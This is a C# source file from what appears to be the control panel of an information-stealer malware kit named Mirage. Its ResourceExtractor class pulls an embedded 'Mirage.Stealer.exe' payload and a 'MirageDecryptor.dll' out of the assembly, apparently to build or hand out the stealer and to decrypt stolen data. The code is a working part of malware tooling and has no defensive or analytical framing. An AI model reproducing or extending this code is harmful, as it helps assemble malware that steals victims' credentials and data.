using System.IO;
using System.Reflection;

namespace Mirage.Panel.Services;

public class ResourceExtractor
{
    public byte[] ExtractStealer()
    {
        return Extract("Mirage.Panel.Resources.Mirage.Stealer.exe");
    }

    public byte[] ExtractDecryptor()
    {
        return Extract("Mirage.Panel.Resources.MirageDecryptor.dll");
    }

    private static byte[] Extract(string resourceName)
    {
        var asm = Assembly.GetExecutingAssembly();
        using var stream = asm.GetManifestResourceStream(resourceName)
            ?? throw new FileNotFoundException($"Resource '{resourceName}' not found");
        using var ms = new MemoryStream();
        stream.CopyTo(ms);
        return ms.ToArray();
    }
}
